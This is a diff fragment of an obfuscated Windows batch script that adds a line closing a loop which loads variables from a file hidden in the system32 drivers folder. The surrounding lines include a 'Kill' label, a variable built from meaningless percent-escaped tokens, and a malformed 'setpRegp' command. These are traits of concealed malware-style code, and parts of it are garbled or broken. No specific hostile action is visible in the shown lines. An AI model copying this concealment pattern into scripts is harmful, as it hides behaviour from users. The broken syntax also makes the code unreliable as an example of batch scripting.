@@ -12,6 +12,7 @@ goto Kill
 )
 if "C:\Users\puncher\AppData\Roaming"=="" (
 FOR /F "tokens=*" %%i in (C:\WINDOWS\system32\drivers\values.log
+) do set %%i
 )
 set teRAr=%%bh%%jkq%%vz%%f7%%4c50t%%u1w8%%(cdf9)%%@6tc%%
 setpRegp ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
